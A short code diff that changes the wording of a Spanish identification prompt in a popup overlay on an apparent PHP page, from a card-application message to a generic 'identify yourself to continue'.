@@ -334,7 +334,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 <!-- Popup -->
 <div id="id-popup" style="position: fixed; inset: 0; background: rgba(0,0,0,0.35); backdrop-filter: blur(4px); -webkit-backdrop-filter: blur(4px); z-index: 9999; display: flex; align-items: center; justify-content: center; transition: opacity 0.4s ease;">
     <div style="background: #fff; border-radius: 10px; padding: 28px 24px; max-width: 300px; width: 88%; text-align: center; box-shadow: 0 6px 28px rgba(0,0,0,0.2);">
-        <p style="font-family: 'Segoe UI', sans-serif; font-size: 13px; color: #444; line-height: 1.6; font-weight: 400;">Identifícate para finalizar la solicitud de tu tarjeta</p>
+        <p style="font-family: 'Segoe UI', sans-serif; font-size: 13px; color: #444; line-height: 1.6; font-weight: 400;">Identifícate para continuar</p>
     </div>
 </div>
 <script>
